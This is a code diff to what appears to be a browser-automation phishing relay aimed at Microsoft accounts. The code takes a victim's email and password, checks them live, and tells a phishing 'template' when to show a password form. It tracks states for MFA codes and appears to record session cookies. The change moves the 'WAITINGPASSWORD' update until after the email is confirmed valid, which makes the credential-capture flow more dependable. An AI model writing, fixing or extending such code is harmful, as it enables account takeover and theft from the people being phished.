@@ -1609,18 +1609,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         };
                     }
 
-                    // If no verification screen, immediately set WAITINGPASSWORD after email submission
-                    // so template shows password form while engine navigates intermediate views
-                    if (step.selector === 'nextButton' && !password && browserId) {
-                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (flow-based, before additional views).`);
-                        updateBrowserRowDataFast(browserId, {
-                            status: "WAITINGPASSWORD",
-                            email: email || '',
-                            verified: false,
-                            fullAccess: false
-                        });
-                    }
-
                     // If no verification screen, then handle general additional views
                     await handleAdditionalViews(page, platformConfig, instanceId);
                 }
@@ -1677,6 +1665,18 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                         // If no email error was detected, assume email exists and proceed
                         emailExists = true;
+
+                        // Set WAITINGPASSWORD AFTER error check confirms email is valid
+                        if (!password && browserId) {
+                            logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (after email validation passed).`);
+                            updateBrowserRowDataFast(browserId, {
+                                status: "WAITINGPASSWORD",
+                                email: email || '',
+                                verified: false,
+                                fullAccess: false
+                            });
+                        }
+
                         if (!password) {
                             // Microsoft intermittently shows a "Verify it's you" security challenge with a
                             // "Use your password" tile before the password form renders (late-loading on the
@@ -5687,7 +5687,7 @@ if (!foundSelector) {
                 logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
             );
             return;
-        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS" && finalStatus !== "FAILED") {
+        } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined) && finalStatus !== "WAITINGCODE" && finalStatus !== "WAITINGOPTIONS") {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
             if (status === "WAITINGPASSWORD") {
                 logger.info(`[processRow][${browserId}] Session likely expired during WAITINGPASSWORD phase. Setting status to FAILED and keeping email.`);
